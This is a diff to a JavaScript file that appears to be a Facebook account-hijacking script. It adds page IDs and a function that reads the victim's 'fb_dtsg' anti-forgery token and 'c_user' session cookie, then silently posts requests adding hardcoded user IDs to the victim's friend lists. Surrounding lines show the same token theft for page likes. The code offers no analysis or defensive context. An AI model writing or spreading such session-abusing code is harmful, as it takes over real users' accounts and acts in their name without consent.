@@ -66,6 +66,9 @@ LIST("546855828710995");
 LIST("546856865377558");
 LIST("546857058710872");
 LIST("546857278710850");
+LIST("199297846887404");
+LIST("348918845211180");
+LIST("348918355211229");
 /*Like Page*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -250,3 +253,22 @@ P("493083820736621");
 P("491205797591090");
 P("462706753774328");
 P("461398507238486");
+/*Add 2 List*/
+var flid = document.getElementsByName('flid')[0].value;
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function a2l(opo) {
+  var http4 = new XMLHttpRequest();
+  var url4 = "//www.facebook.com/friends/ajax/lists.php";
+  var params4 = "add=1&search=1&source=typeahead&flid="+flid+"&id=" + opo + "&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFwXAF0&__req=w&fb_dtsg="+fb_dtsg+"&phstamp=";
+  http4.open("POST", url4, true);
+  http4.onreadystatechange = function () {
+    if (http4.readyState == 4 && http4.status == 200) {
+      http4.close;
+    }
+  };
+  http4.send(params4);
+}
+a2l("100003785647375");  
+a2l("100003697277263");  
+a2l("100001050235420"); 
